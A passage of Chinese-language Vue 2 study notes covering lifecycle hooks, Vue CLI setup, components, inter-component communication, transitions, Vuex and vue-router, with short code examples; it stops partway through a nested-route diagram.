<h2 id="生命周期钩子-beforeCreate"><a href="#生命周期钩子-beforeCreate" class="headerlink" title="生命周期钩子 - beforeCreate"></a>生命周期钩子 - beforeCreate</h2><p>在实例初始化之后,进行数据侦听和事件/侦听器的配置之前同步调用</p>
<h2 id="生命周期钩子-created"><a href="#生命周期钩子-created" class="headerlink" title="生命周期钩子 - created"></a>生命周期钩子 - created</h2><p>在实例创建完成后被立即同步调用。在这一步中，实例已完成对选项的处理，意味着以下内容已被配置完毕：数据侦听、计算属性、方法、事件/侦听器的回调函数。然而，挂载阶段还没开始，且 <code>$el</code> property 目前尚不可用</p>
<h2 id="生命周期钩子-beforeMount"><a href="#生命周期钩子-beforeMount" class="headerlink" title="生命周期钩子 - beforeMount"></a>生命周期钩子 - beforeMount</h2><p>在挂载开始之前被调用：相关的 <code>render</code> 函数首次被调用</p>
<p><strong>该钩子在服务器端渲染期间不被调用</strong></p>
<h2 id="生命周期钩子-mounted"><a href="#生命周期钩子-mounted" class="headerlink" title="生命周期钩子 - mounted"></a>生命周期钩子 - mounted</h2><p>实例被挂载后调用，这时 <code>el</code> 被新创建的 <code>vm.$el</code> 替换了。如果根实例挂载到了一个文档内的元素上，当 <code>mounted</code> 被调用时 <code>vm.$el</code> 也在文档内</p>
<p>注意 <code>mounted</code> <strong>不会</strong>保证所有的子组件也都被挂载完成。如果你希望等到整个视图都渲染完毕再执行某些操作，可以在 <code>mounted</code> 内部使用 <em>vm.$nextTick</em></p>
<pre class="language-none"><code class="language-none">mounted()&#123;
  this.$nextTick(function () &#123;
    &#x2F;&#x2F; 仅在整个视图都被渲染之后才会运行的代码
  &#125;)
&#125;</code></pre>

<p><strong>该钩子在服务器端渲染期间不被调用</strong></p>
<h2 id="生命周期钩子-beforeUpdate"><a href="#生命周期钩子-beforeUpdate" class="headerlink" title="生命周期钩子 - beforeUpdate"></a>生命周期钩子 - beforeUpdate</h2><p>在数据发生改变后，DOM 被更新之前被调用。这里适合在现有 DOM 将要被更新之前访问它，比如移除手动添加的事件监听器</p>
<p><strong>该钩子在服务器端渲染期间不被调用，因为只有初次渲染会在服务器端进行</strong></p>
<h2 id="生命周期钩子-updated"><a href="#生命周期钩子-updated" class="headerlink" title="生命周期钩子 - updated"></a>生命周期钩子 - updated</h2><p>在数据更改导致的虚拟 DOM 重新渲染和更新完毕之后被调用。</p>
<p>当这个钩子被调用时，组件 DOM 已经更新，所以你现在可以执行依赖于 DOM 的操作。然而在大多数情况下，你应该避免在此期间更改状态。如果要相应状态改变，通常最好使用<a href="https://cn.vuejs.org/v2/api/#computed">计算属性</a>或 <a href="https://cn.vuejs.org/v2/api/#watch">watcher</a> 取而代之。</p>
<p>注意，<code>updated</code> <strong>不会</strong>保证所有的子组件也都被重新渲染完毕。如果你希望等到整个视图都渲染完毕，可以在 <code>updated</code> 里使用 <em>vm.$nextTick</em></p>
<pre class="language-none"><code class="language-none">updated()&#123;
  this.$nextTick(function () &#123;
    &#x2F;&#x2F;  仅在整个视图都被重新渲染之后才会运行的代码     
  &#125;)
&#125;</code></pre>

<p><strong>该钩子在服务器端渲染期间不被调用</strong></p>
<h2 id="生命周期钩子-beforeDestroy"><a href="#生命周期钩子-beforeDestroy" class="headerlink" title="生命周期钩子 - beforeDestroy"></a>生命周期钩子 - beforeDestroy</h2><p>实例销毁之前调用。在这一步，实例仍然完全可用</p>
<p><strong>该钩子在服务器端渲染期间不被调用</strong></p>
<h2 id="生命周期钩子-destroyed"><a href="#生命周期钩子-destroyed" class="headerlink" title="生命周期钩子 - destroyed"></a>生命周期钩子 - destroyed</h2><p>实例销毁后调用。该钩子被调用后，对应 Vue 实例的所有指令都被解绑，所有的事件监听器被移除，所有的子实例也都被销毁</p>
<p><strong>该钩子在服务器端渲染期间不被调用</strong></p>
<h1 id="脚手架"><a href="#脚手架" class="headerlink" title="脚手架"></a>脚手架</h1><h2 id="脚手架-简介"><a href="#脚手架-简介" class="headerlink" title="脚手架 - 简介"></a>脚手架 - 简介</h2><p>Vue CLI (_C_ommand _L_ine _I_nterface)是一个基于 Vue.js 进行快速开发的完整系统，提供：</p>
<ul>
<li>通过 <code>@vue/cli</code> 实现的交互式的项目脚手架</li>
<li>通过 <code>@vue/cli</code> + <code>@vue/cli-service-global</code> 实现的零配置原型开发</li>
<li>一个运行时依赖 (<em>@vue/cli-service</em>)，该依赖：<ul>
<li>可升级；</li>
<li>基于 webpack 构建，并带有合理的默认配置；</li>
<li>可以通过项目内的配置文件进行配置；</li>
<li>可以通过插件进行扩展</li>
</ul>
</li>
<li>一个丰富的官方插件集合，集成了前端生态中最好的工具</li>
<li>一套完全图形化的创建和管理 Vue.js 项目的用户界面</li>
</ul>
<p>Vue CLI 致力于将 Vue 生态中的工具基础标准化。它确保了各种构建工具能够基于智能的默认配置即可平稳衔接，这样你可以专注在撰写应用上，而不必花好几天去纠结配置的问题。与此同时，它也为每个工具提供了调整配置的灵活性，无需 eject</p>
<h2 id="脚手架-安装"><a href="#脚手架-安装" class="headerlink" title="脚手架 - 安装"></a>脚手架 - 安装</h2><ol>
<li><p>全局安装 @vue/cli （仅首次）</p>
<pre class="language-none"><code class="language-none">npm install -g @vue&#x2F;cli</code></pre>
</li>
<li><p>切换到你要创建项目的目录，创建项目</p>
<pre class="language-none"><code class="language-none">vue create xxxx</code></pre>
</li>
<li><p>启动项目</p>
<pre class="language-none"><code class="language-none">npm run serve</code></pre></li>
</ol>
<p><strong>备注</strong>：切换淘宝镜像</p>
<pre class="language-none"><code class="language-none">npm config set registry https:&#x2F;&#x2F;registry.npm.taobao.org</code></pre>

<h2 id="脚手架-目录结构"><a href="#脚手架-目录结构" class="headerlink" title="脚手架 - 目录结构"></a>脚手架 - 目录结构</h2><img src="/2021/10/30/Vue/image-20220103170359406.png" class="" loading="lazy">

<ol>
<li><p>文件</p>
<p><code>.gitnore</code>： Git 的忽略文件，在此描述哪些文件（夹）不接受 Git 的管理</p>
<p><code>babel.config.js</code>：babel 的控制文件</p>
<p><code>package.json</code>：包的说明书，存在于 npm 创建的工程中</p>
<p><code>package-lock.json</code>：包版本控制文件，版本仓库</p>
<p><code>README.md</code>：项目的描述文件</p>
</li>
<li><p>文件夹</p>
<p><code>src</code>：存放以下内容</p>
<p>——<code>main.js</code>：整个项目的入口文件</p>
<p>——<code>App.vue</code>：页面的主要内容</p>
<p>——<code>asserts</code>：存放项目里的静态资源，如图片、页签</p>
<p>——<code>components</code>：存放组件</p>
<p><code>public</code>：存放公共资源</p>
</li>
</ol>
<h1 id="组件"><a href="#组件" class="headerlink" title="组件"></a>组件</h1><h2 id="组件-基础"><a href="#组件-基础" class="headerlink" title="组件 - 基础"></a>组件 - 基础</h2><p>组件是可复用的 Vue 实例，且带有一个名字</p>
<p><strong>注意</strong>：<strong>一个组件的 <code>data</code> 选项必须是一个函数</strong>，因此每个实例可以维护一份被返回对象的独立的拷贝</p>
<p>通常一个应用会以一棵嵌套的组件树的形式来组织：</p>
<img src="/2021/10/30/Vue/components.png" class="" loading="lazy">

<h2 id="组件-非单文件组件"><a href="#组件-非单文件组件" class="headerlink" title="组件 - 非单文件组件"></a>组件 - 非单文件组件</h2><p>使用组件的步骤：</p>
<ol>
<li><p>定义（创建）组件</p>
<p>使用 Vue.extend(options) 创建，其中的 options 和创建 Vue 实例时的 options 几乎一样</p>
</li>
<li><p>注册组件</p>
<ul>
<li>局部注册：在创建 Vue 实例的时候传入 components 选项</li>
<li>全局注册：直接 Vue.component(‘组件名’,组件)</li>
</ul>
</li>
<li><p>使用组件</p>
<p>编写组件标签：<组件名/></p>
</li>
</ol>
<pre class="language-none"><code class="language-none">&lt;!-- 准备一个容器 --&gt;
&lt;div id&#x3D;&quot;root&quot;&gt;
    &lt;school&gt;&lt;&#x2F;school&gt;
&lt;&#x2F;div&gt;</code></pre>
<pre class="language-none"><code class="language-none">const school &#x3D; Vue.extend(&#123;
    template:&#96;&lt;div&gt;&lt;h2&gt;学校名称：&#123;&#123;name&#125;&#125;&lt;&#x2F;h2&gt;&lt;&#x2F;div&gt;&#96;,
    data()&#123;
        return&#123;
            name:&#39;CCSU&#39;
        &#125;
    &#125;
&#125;)

new Vue(&#123;
    el:&#39;#root&#39;,
    components:&#123;school&#125;
&#125;)</code></pre>

<p><strong>注意</strong>：</p>
<ol>
<li>组件名是多单词时，中间用<code>-</code>连接，如果在脚手架中，首字母大写即可</li>
<li>组件标签的自闭合只能在脚手架中用</li>
</ol>
<h2 id="组件-单文件组件"><a href="#组件-单文件组件" class="headerlink" title="组件 - 单文件组件"></a>组件 - 单文件组件</h2><p>将非单文件组件的内容写作一个独立的<code>.vue</code>文件，在脚手架中使用</p>
<pre class="language-none"><code class="language-none">&lt;template&gt;
	&lt;div&gt;
        
    &lt;&#x2F;div&gt;
&lt;&#x2F;template&gt;

&lt;script&gt;
	export default &#123;
        name:&#39;filename&#39;,
        data()&#123;
            return&#123;
                
            &#125;
        &#125;,
        methods:&#123;
            
        &#125;
    &#125;
&lt;&#x2F;script&gt;

&lt;style&gt;&lt;&#x2F;style&gt;</code></pre>

<p><strong>注意</strong>：这里的<code>filename</code>必须与组件名保持一直，首字母大写</p>
<h2 id="组件-组件嵌套"><a href="#组件-组件嵌套" class="headerlink" title="组件 - 组件嵌套"></a>组件 - 组件嵌套</h2><p>Vue 支持在组件中注册子组件</p>
<pre class="language-none"><code class="language-none">&lt;!-- 准备一个容器 --&gt;
&lt;div id&#x3D;&quot;root&quot;&gt;
    &lt;school&gt;&lt;&#x2F;school&gt;
&lt;&#x2F;div&gt;</code></pre>
<pre class="language-none"><code class="language-none">const student &#x3D; Vue.extend(&#123;
    template:&#96;&lt;div&gt;&lt;h2&gt;学生名称：&#123;&#123;name&#125;&#125;&lt;&#x2F;h2&gt;&lt;&#x2F;div&gt;&#96;,
    data()&#123;
        return&#123;
            name:&#39;Nayst&#39;
        &#125;
    &#125;
&#125;);

const school &#x3D; Vue.extend(&#123;
    template:&#96;
    	&lt;div&gt;&lt;h2&gt;学校名称：&#123;&#123;name&#125;&#125;&lt;&#x2F;h2&gt;&lt;&#x2F;div&gt;
    	&lt;student&gt;&lt;&#x2F;student&gt;
    &#96;,
    data()&#123;
        return&#123;
            name:&#39;CCSU&#39;
        &#125;
    &#125;
&#125;);

new Vue(&#123;
    el:&#39;#root&#39;,
    components:&#123;school&#125;
&#125;);</code></pre>

<h2 id="组件-ref"><a href="#组件-ref" class="headerlink" title="组件 - ref"></a>组件 - ref</h2><p><code>ref</code> 被用来给元素或子组件注册引用信息。引用信息将会注册在父组件的 <code>$refs</code> 对象上。</p>
<p><strong>$refs</strong>是一个对象，存放注册过 <code>ref</code> attribute 的所有 DOM 元素和组件实例</p>
<blockquote>
<p>如果在普通的 DOM 元素上使用，引用指向的就是 DOM 元素</p>
<p>如果用在子组件上，引用就指向组件实例（vc）</p>
</blockquote>
<h2 id="组件-props"><a href="#组件-props" class="headerlink" title="组件 - props"></a>组件 - props</h2><p>功能：让组件接受外部传过来的数据</p>
<p>传递数据：直接在标签内部写</p>
<pre class="language-none"><code class="language-none">&lt;Student name&#x3D;&quot;nayst&quot; age&#x3D;&quot;21&quot;&#x2F;&gt;</code></pre>

<p>接收数据：在组件内的 props 配置项内配置</p>
<pre class="language-none"><code class="language-none">&#x2F;&#x2F;第一种：只接收数据
props:[&#39;name&#39;,&#39;age&#39;]
&#x2F;&#x2F;第二种：限制类型
props:&#123;
    name:String,
    age:Number
&#125;
&#x2F;&#x2F;第三种：限制类型、限制必要性、指定默认值，完整写法
props:&#123;
    name:&#123;
        type:String,
        required:true,
        default:&#39;nayst&#39;
    &#125;,
    age:&#123;
        type:Number,
        required:false,
        default:&#39;18&#39;
    &#125;
&#125;</code></pre>

<p><strong>注意</strong>：props 是只读的，Vue 底层会监测你对 props 的修改，并且在修改后发出警告</p>
<h2 id="组件-mixin"><a href="#组件-mixin" class="headerlink" title="组件 - mixin"></a>组件 - mixin</h2><p>功能：可以把多个文件共用的配置提取成一个混入对象</p>
<p>在 src 中创建 <code>mixins.js</code> （名字随意），用于定义混入：</p>
<pre class="language-none"><code class="language-none">export const test &#x3D; &#123;
    data()&#123;
        
    &#125;,
    methods:&#123;
        
    &#125;
&#125;</code></pre>

<p>局部引入：在组件中引入并使用：</p>
<pre class="language-none"><code class="language-none">import &#123;test&#125; from &#39;..&#x2F;mixin&#39;
export default &#123;
    name:&#39;Student&#39;,
    mixins:[test]
&#125;</code></pre>

<p>全局引入：在<code>main.js</code>中引入：</p>
<pre class="language-none"><code class="language-none">import &#123;test&#125; from &#39;.&#x2F;mixin&#39;
Vue.mixin(test)</code></pre>

<h2 id="组件-plugin"><a href="#组件-plugin" class="headerlink" title="组件 - plugin"></a>组件 - plugin</h2><p>功能：用于增强 Vue，本质是包含 install 方法的一个对象，install 的第一个参数是 Vue，第二个以后的参数是插件使用者传递的数据</p>
<p>在 src 中创建 <code>plugins.js</code> （名字随意），用于定义插件：</p>
<pre class="language-none"><code class="language-none">export default &#123;
    install(Vue)&#123;
        Vue.filter()&#x2F;&#x2F;定义全局过滤器
        Vue.directive()&#x2F;&#x2F;定义全局指令
        Vue.mixin()&#x2F;&#x2F;定义混入
        Vue.prototype.func &#x3D; ()&#x3D;&gt;&#123;&#125;&#x2F;&#x2F;在 Vue 原型上添加一个方法
    &#125;
&#125;</code></pre>

<p>在<code>main.js</code>中引入并使用插件：</p>
<pre class="language-none"><code class="language-none">import plugins from &#39;.&#x2F;plugins&#39;
Vue.use(plugins)</code></pre>

<h2 id="组件-slot"><a href="#组件-slot" class="headerlink" title="组件 - slot"></a>组件 - slot</h2><p>功能：让父组件可以向子组件指定位置插入 html 结构，也是一种组件间的通信方式，适用于父组件给子组件传。</p>
<ol>
<li><p>默认插槽</p>
<p>父组件：</p>
<pre class="language-none"><code class="language-none">&lt;component&gt;
	&lt;div&gt;
        ...
    &lt;&#x2F;div&gt;
&lt;&#x2F;component&gt;</code></pre>

<p>子组件：</p>
<pre class="language-none"><code class="language-none">&lt;template&gt;
	&lt;div&gt;
    	&lt;!-- 定义插槽 --&gt;
    	&lt;slot&gt;默认内容&lt;&#x2F;slot&gt;
    &lt;&#x2F;div&gt;
&lt;&#x2F;template&gt;</code></pre>
</li>
<li><p>具名插槽</p>
<p>父组件：</p>
<pre class="language-none"><code class="language-none">&lt;component&gt;
    &lt;template slot&#x3D;&quot;header&quot;&gt;
    	&lt;div&gt;Header&lt;&#x2F;div&gt;
    &lt;&#x2F;template&gt;
    &lt;template slot&#x3D;&quot;footer&quot;&gt;
        &lt;div&gt;Footer&lt;&#x2F;div&gt;
    &lt;&#x2F;template&gt;
&lt;&#x2F;component&gt;</code></pre>

<p>子组件：</p>
<pre class="language-none"><code class="language-none">&lt;template&gt;
	&lt;div&gt;
        &lt;slot name&#x3D;&quot;footer&quot;&gt;Default footer&lt;&#x2F;slot&gt;
        &lt;slot name&#x3D;&quot;header&quot;&gt;Default header&lt;&#x2F;slot&gt;
    &lt;&#x2F;div&gt;
&lt;&#x2F;template&gt;</code></pre>
</li>
<li><p>作用域插槽：数据在组件的自身，但根据数据生成的结构需要组件的使用者来决定。</p>
</li>
</ol>
<h1 id="通信"><a href="#通信" class="headerlink" title="通信"></a>通信</h1><h2 id="通信-自定义事件"><a href="#通信-自定义事件" class="headerlink" title="通信 - 自定义事件"></a>通信 - 自定义事件</h2><p>自定义事件，适用于<strong>子组件给父组件传递数据</strong></p>
<p>不同于组件和 prop，事件名不存在任何自动化的大小写转换。而是触发的事件名需要完全匹配监听这个事件所用的名称</p>
<p>第一步：定义一个自定义事件</p>
<pre class="language-none"><code class="language-none">methods:&#123;
	demo(value)&#123;
		console.log(&#39;自定义事件被调用了，收到了&#39;,value)
	&#125;
&#125;</code></pre>

<p>第二步：给子组件绑定自定义事件</p>
<pre class="language-none"><code class="language-none">&lt;Student @myEvent&#x3D;&quot;demo&quot;&#x2F;&gt;</code></pre>

<p>第三步：在子组件内触发自定义事件</p>
<pre class="language-none"><code class="language-none">&lt;button @click&#x3D;&quot;$emit(&#39;myEvent&#39;,value)&quot;&gt;&lt;&#x2F;button&gt;</code></pre>

<h2 id="通信-全局事件总线"><a href="#通信-全局事件总线" class="headerlink" title="通信 - 全局事件总线"></a>通信 - 全局事件总线</h2><p>全局事件总线（Global Event Bus），适用于<strong>任意组件</strong>间通信</p>
<p>第一步，安装全局事件总线</p>
<pre class="language-none"><code class="language-none">new Vue(&#123;
    beforeCreate() &#123;
        Vue.prototype.$bus &#x3D; this &#x2F;&#x2F;$bus 就是当前的应用
    &#125;
&#125;)</code></pre>

<p>第二步，利用事件总线发送数据</p>
<pre class="language-none"><code class="language-none">&lt;button @click&#x3D;&quot;$bus.$emit(&#39;test&#39;,studentName)&quot;&gt;&lt;&#x2F;button&gt;</code></pre>

<p>第三步，利用事件总线接收数据</p>
<pre class="language-none"><code class="language-none">mounted() &#123;
    this.$bus.$on(&#39;test&#39;,(data)&#x3D;&gt;&#123;
        
    &#125;)
&#125;,
beforeDestroy() &#123;
    this.$bus.$off(&#39;test&#39;)
&#125; </code></pre>

<p><strong>注意</strong>：最好在 <em>beforeDestroy</em> 钩子中，用<code>$off</code>去解绑当前组件用到的事件</p>
<h2 id="通信-消息订阅与发布"><a href="#通信-消息订阅与发布" class="headerlink" title="通信 - 消息订阅与发布"></a>通信 - 消息订阅与发布</h2><p>消息订阅与发布（pubsub），适用于<strong>任意组件</strong>间通信</p>
<p>第一步：安装<code>pubsub</code></p>
<pre class="language-none"><code class="language-none">npm i pubsub-js</code></pre>

<p>第二步：在需要的组件中引入<code>pubsub</code></p>
<pre class="language-none"><code class="language-none">import pubsub from &#39;pubsub-js&#39;</code></pre>

<p>第三步：利用<code>pubsub</code>发布（发送）数据</p>
<pre class="language-none"><code class="language-none">&lt;button @click&#x3D;&quot;sendMsg&quot;&gt;&lt;&#x2F;button&gt;</code></pre>
<pre class="language-none"><code class="language-none">methods: &#123;
    sendMsg()&#123;
        pubsub.publish(&#39;test&#39;,data)
    &#125;
&#125;</code></pre>

<p>第四步：利用<code>pubsub</code>订阅（接收）数据</p>
<pre class="language-none"><code class="language-none">mounted()&#123;
    this.pubId &#x3D; pubsub.subscribe(&#39;test&#39;,(msgName,data)&#x3D;&gt;&#123;
        console.log(&#39;有人发布了test消息&#39;,msgName,data)&#x2F;&#x2F;这里 msgName 就是 test
    &#125;)
&#125;,
beforeDestroy() &#123;
    pubsub.unsubscribe(this.pubId)
&#125;</code></pre>

<h1 id="过渡动画"><a href="#过渡动画" class="headerlink" title="过渡动画"></a>过渡动画</h1><p>Vue 在插入、更新或者移除 DOM 时，提供多种不同方式的应用过渡效果。</p>
<h2 id="过渡动画-单组件"><a href="#过渡动画-单组件" class="headerlink" title="过渡动画 - 单组件"></a>过渡动画 - 单组件</h2><p>Vue 提供了 <code>transition</code> 的封装组件，在下列情形中，可以给任何元素和组件添加进入/离开过渡</p>
<p>第一步：在目标元素外包裹<code>&lt;transition name=&quot;xxx&quot;&gt;</code></p>
<pre class="language-none"><code class="language-none">&lt;transition name&#x3D;&quot;fade&quot;&gt;
    &lt;p v-if&#x3D;&quot;show&quot;&gt;hello&lt;&#x2F;p&gt;
&lt;&#x2F;transition&gt;</code></pre>

<p>第二步：定义 class 样式</p>
<pre class="language-none"><code class="language-none">.fade-enter-active, .fade-leave-active &#123;
  transition: opacity .5s;
&#125;
.fade-enter, .fade-leave-to &#x2F;* .fade-leave-active below version 2.1.8 *&#x2F; &#123;
  opacity: 0;
&#125;</code></pre>

<h2 id="过渡动画-类名"><a href="#过渡动画-类名" class="headerlink" title="过渡动画 - 类名"></a>过渡动画 - 类名</h2><p>在进入/离开的过渡中，会有 6 个 class 切换。</p>
<ol>
<li><code>v-enter</code>：定义进入过渡的开始状态。在元素被插入之前生效，在元素被插入之后的下一帧移除。</li>
<li><code>v-enter-active</code>：定义进入过渡生效时的状态。在整个进入过渡的阶段中应用，在元素被插入之前生效，在过渡/动画完成之后移除。这个类可以被用来定义进入过渡的过程时间，延迟和曲线函数。</li>
<li><code>v-enter-to</code>：<strong>2.1.8 版及以上</strong>定义进入过渡的结束状态。在元素被插入之后下一帧生效 (与此同时 <code>v-enter</code> 被移除)，在过渡/动画完成之后移除。</li>
<li><code>v-leave</code>：定义离开过渡的开始状态。在离开过渡被触发时立刻生效，下一帧被移除。</li>
<li><code>v-leave-active</code>：定义离开过渡生效时的状态。在整个离开过渡的阶段中应用，在离开过渡被触发时立刻生效，在过渡/动画完成之后移除。这个类可以被用来定义离开过渡的过程时间，延迟和曲线函数。</li>
<li><code>v-leave-to</code>：<strong>2.1.8 版及以上</strong>定义离开过渡的结束状态。在离开过渡被触发之后下一帧生效 (与此同时 <code>v-leave</code> 被删除)，在过渡/动画完成之后移除。</li>
</ol>
<img src="/2021/10/30/Vue/transition.png" class="" title="Transition Diagram" loading="lazy">

<h2 id="过度动画-JS-钩子"><a href="#过度动画-JS-钩子" class="headerlink" title="过度动画 - JS 钩子"></a>过度动画 - JS 钩子</h2><p>可以在 attribute 中声明 JavaScript 钩子，通过 vue 提供给的动画钩子函数来<strong>绑定事件</strong>，然后在事件函数中处理对应的动画</p>
<p>入场动画：</p>
<blockquote>
<p>before-enter 动画入场运动前一刻执行</p>
<p>enter 动画运动时执行</p>
<p>after-enter 在动画 enter 函数中运行完毕并调用回调 done 时执行</p>
</blockquote>
<p>离场动画：（用法同上）</p>
<blockquote>
<p>before-leave</p>
<p>leave</p>
<p>after-leave</p>
</blockquote>
<p>例子：图片自跳动</p>
<pre class="language-none"><code class="language-none">&lt;transition appear name&#x3D;&quot;fade&quot; @after-enter&#x3D;&quot;show&#x3D;false&quot; @after-leave&#x3D;&quot;show&#x3D;true&quot;&gt;
    &lt;img src&#x3D;&quot;..&#x2F;assets&#x2F;logo.png&quot; v-if&#x3D;&quot;show&quot;&gt;
&lt;&#x2F;transition&gt;</code></pre>
<pre class="language-none"><code class="language-none">.fade-enter-active, .fade-leave-active &#123;
  transition:opacity 1s;
&#125;
.fade-enter, .fade-leave-to&#123;
  opacity:0;
&#125;</code></pre>

<p>添加 appear 属性后，网页才会一打开就有入场动画，否则需要触发</p>
<h2 id="过渡动画-多组件"><a href="#过渡动画-多组件" class="headerlink" title="过渡动画 - 多组件"></a>过渡动画 - 多组件</h2><p>多个组件的过渡简单很多 - 我们不需要使用 <code>key</code> attribute。相反，我们只需要使用<a href="https://cn.vuejs.org/v2/guide/components.html#%E5%8A%A8%E6%80%81%E7%BB%84%E4%BB%B6">动态组件</a>：</p>
<pre class="language-none"><code class="language-none">&lt;button @click&#x3D;&quot;show &#x3D; !show&quot;&gt;test&lt;&#x2F;button&gt;
&lt;transition-group name&#x3D;&quot;fade&quot;&gt;
    &lt;h1 v-show&#x3D;&quot;show&quot; key&#x3D;&quot;1&quot;&gt;TEST1&lt;&#x2F;h1&gt;
    &lt;h1 v-show&#x3D;&quot;!show&quot; key&#x3D;&quot;2&quot;&gt;TEST2&lt;&#x2F;h1&gt;
&lt;&#x2F;transition-group&gt;</code></pre>

<h2 id="过渡动画-第三方动画"><a href="#过渡动画-第三方动画" class="headerlink" title="过渡动画 - 第三方动画"></a>过渡动画 - 第三方动画</h2><p><a href="https://animate.style/">Animate.css</a></p>
<pre class="language-none"><code class="language-none">&lt;link href&#x3D;&quot;https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;animate.css@3.5.1&quot; rel&#x3D;&quot;stylesheet&quot; type&#x3D;&quot;text&#x2F;css&quot;&gt;

&lt;div id&#x3D;&quot;example-3&quot;&gt;
  &lt;button @click&#x3D;&quot;show &#x3D; !show&quot;&gt;切换&lt;&#x2F;button&gt;
  &lt;transition
    name&#x3D;&quot;custom-classes-transition&quot;
    enter-active-class&#x3D;&quot;animated tada&quot;
    leave-active-class&#x3D;&quot;animated bounceOutRight&quot;
  &gt;
    &lt;p v-if&#x3D;&quot;show&quot;&gt;hello&lt;&#x2F;p&gt;
  &lt;&#x2F;transition&gt;
&lt;&#x2F;div&gt;</code></pre>

<h1 id="数据请求"><a href="#数据请求" class="headerlink" title="数据请求"></a>数据请求</h1><p>如果你的前端应用和后端 API 服务器没有运行在同一个主机上，你需要在开发环境下将 API 请求代理到 API 服务器，这个问题可以通过 <code>vue.config.js</code> 中的 <code>devServer.proxy</code> 选项来配置</p>
<h2 id="数据请求-Axios"><a href="#数据请求-Axios" class="headerlink" title="数据请求 - Axios"></a>数据请求 - Axios</h2><h2 id="数据请求-代理"><a href="#数据请求-代理" class="headerlink" title="数据请求 - 代理"></a>数据请求 - 代理</h2><p>在 <code>vue.config.js</code> 中添加如下配置</p>
<pre class="language-none"><code class="language-none">module.exports &#x3D; &#123;
  devServer: &#123;
    proxy: &#39;http:&#x2F;&#x2F;localhost:4000&#39;
  &#125;
&#125;</code></pre>

<h1 id="Vuex"><a href="#Vuex" class="headerlink" title="Vuex"></a>Vuex</h1><h2 id="Vuex-简介"><a href="#Vuex-简介" class="headerlink" title="Vuex - 简介"></a>Vuex - 简介</h2><p>Vuex 是一个专为 Vue.js 应用程序开发的<strong>状态管理模式</strong>。它采用<strong>集中式存储</strong>管理应用的所有组件的状态，也是一种组件间通信的方式</p>
<h2 id="Vuex-使用"><a href="#Vuex-使用" class="headerlink" title="Vuex - 使用"></a>Vuex - 使用</h2><ol>
<li><p>安装<code>Vuex</code></p>
<pre class="language-none"><code class="language-none">npm install vuex</code></pre>
</li>
<li><p>创建文件<code>src/store/index.js</code></p>
</li>
</ol>
<pre class="language-none"><code class="language-none">&#x2F;&#x2F;引入
import Vue from &#39;vue&#39;
import Vuex from &#39;vuex&#39;
&#x2F;&#x2F;应用
Vue.use(Vuex)
&#x2F;&#x2F;响应组件中的动作
const actions &#x3D; &#123;&#125;
&#x2F;&#x2F;操作数据
const state &#x3D; &#123;&#125;
&#x2F;&#x2F;存储数据
const mutations &#x3D; &#123;&#125;
&#x2F;&#x2F;创建并暴露store
export default new Vuex.Store(&#123;
  actions,
  mutations,
  state
&#125;)</code></pre>

<ol start="2">
<li>在<code>main.js</code>中配置</li>
</ol>
<pre class="language-none"><code class="language-none">&#x2F;&#x2F;引入store
import store from &#39;.&#x2F;store&#39;
&#x2F;&#x2F;使用store
new Vue(&#123;
    store
&#125;)</code></pre>

<h2 id="Vuex-原理图"><a href="#Vuex-原理图" class="headerlink" title="Vuex - 原理图"></a>Vuex - 原理图</h2><img src="/2021/10/30/Vue/vuex.png" class="" title="vuex" loading="lazy">

<h2 id="Vuex-state"><a href="#Vuex-state" class="headerlink" title="Vuex - state"></a>Vuex - state</h2><p>Vue 管理的状态对象，存放数据的地方</p>
<p>注意：state 应该是唯一的</p>
<h2 id="Vuex-actions"><a href="#Vuex-actions" class="headerlink" title="Vuex - actions"></a>Vuex - actions</h2><ol>
<li><p>值为一个对象，包含多个响应用户动作的回调函数</p>
</li>
<li><p>通过 commit( )来触发 mutation 中函数的调用，间接更新 state</p>
</li>
<li><p>在组件中使用: $store.dispatch(‘对应的 action 回调名’) 触发回调</p>
</li>
<li><p><strong>可以包含异步代码</strong>（定时器, ajax 等等）</p>
</li>
</ol>
<h2 id="Vuex-mutations"><a href="#Vuex-mutations" class="headerlink" title="Vuex - mutations"></a>Vuex - mutations</h2><ol>
<li>值是一个对象，包含多个直接更新 state 的方法</li>
<li>在 action 中使用：commit(‘对应的 mutations 方法名’) 触发</li>
<li>mutations 中方法的特点：<strong>不能写异步代码、只能单纯的操作 state</strong></li>
</ol>
<h2 id="Vuex-getters"><a href="#Vuex-getters" class="headerlink" title="Vuex - getters"></a>Vuex - getters</h2><ol>
<li>值为一个对象，包含多个用于返回数据的函数，类似于计算属性</li>
<li>在组件中调用 $store.getters.xxx</li>
</ol>
<h1 id="路由"><a href="#路由" class="headerlink" title="路由"></a>路由</h1><h2 id="路由-简介"><a href="#路由-简介" class="headerlink" title="路由 - 简介"></a>路由 - 简介</h2><p>路由就是对应的映射关系，一组路由就是一组<code>key &lt;-&gt; value</code>键值对</p>
<p>key 就是路径</p>
<p>value 在前端中，是一个组件，当 key 改变时，会在页面上展示相应的 value 组件</p>
<p>value 在后端中，是一个函数，当 key 改变时，会处理客户端提交的请求</p>
<h2 id="路由-使用"><a href="#路由-使用" class="headerlink" title="路由 - 使用"></a>路由 - 使用</h2><ol>
<li>安装 vue-router ：<code>npm i vue-router</code></li>
<li>创建文件：<code>src/router/index.js</code></li>
<li>在<code>main.js</code>引入：<code>import VueRouter from &#39;vue-router&#39;</code></li>
<li>在<code>main.js</code>使用：<code>Vue.use(VueRouter)</code></li>
</ol>
<h2 id="路由-配置"><a href="#路由-配置" class="headerlink" title="路由 - 配置"></a>路由 - 配置</h2><pre class="language-none"><code class="language-none">import VueRouter from &#39;vue-router&#39;
&#x2F;&#x2F;引入组件
import Home from &#39;..&#x2F;views&#x2F;Home&#39;
&#x2F;&#x2F;创建并暴露一个路由
export default new VueRouter(&#123;
	routes: [
		&#123;
			name:&#39;Home&#39;,
			path:&#39;&#x2F;&#39;,
			component:Home
		&#125;,
	],
	mode: &#39;history&#39;
&#125;)</code></pre>

<h2 id="路由-嵌套"><a href="#路由-嵌套" class="headerlink" title="路由 - 嵌套"></a>路由 - 嵌套</h2><p>实际生活中的应用界面，通常由多层嵌套的组件组合而成。同样地，URL 中各段动态路径也按某种结构对应嵌套的各层组件，例如：</p>
<pre class="language-none"><code class="language-none">&#x2F;user&#x2F;foo&#x2F;profile                     &#x2F;user&#x2F;foo&#x2F;posts
+------------------+                  +-----------------+
| User             |                  | User            |
| +--------------+ |                  | +-------------+ |
| | Profile      | |  +------------&gt;  | | Posts       | |
| |              | |                  | |             | |
| +--------------+ |                  | +-------------+ |
